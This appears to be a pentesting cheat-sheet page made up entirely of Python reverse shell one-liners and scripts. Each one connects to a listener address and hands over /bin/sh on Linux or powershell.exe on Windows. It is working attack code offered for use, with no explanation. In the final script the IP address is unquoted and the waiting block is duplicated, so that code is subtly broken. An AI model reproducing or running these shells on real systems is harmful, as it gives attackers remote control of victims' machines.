# Python

## for Linux

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
```

```text
#!/usr/bin/env python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```



## for Windows

```text
exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

or

```text
python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

```text
import os, socket, subprocess, threading, sys

def s2p(s, p):
    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()

def p2s(s, p):
    while True: s.send(p.stdout.read(1).encode())

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: s.connect((10.0.0.1, 666)); break
    except: pass

p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)

threading.Thread(target=s2p, args=[s,p], daemon=True).start()

threading.Thread(target=p2s, args=[s,p], daemon=True).start()

try: p.wait()
except: s.close(); sys.exit(0)

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

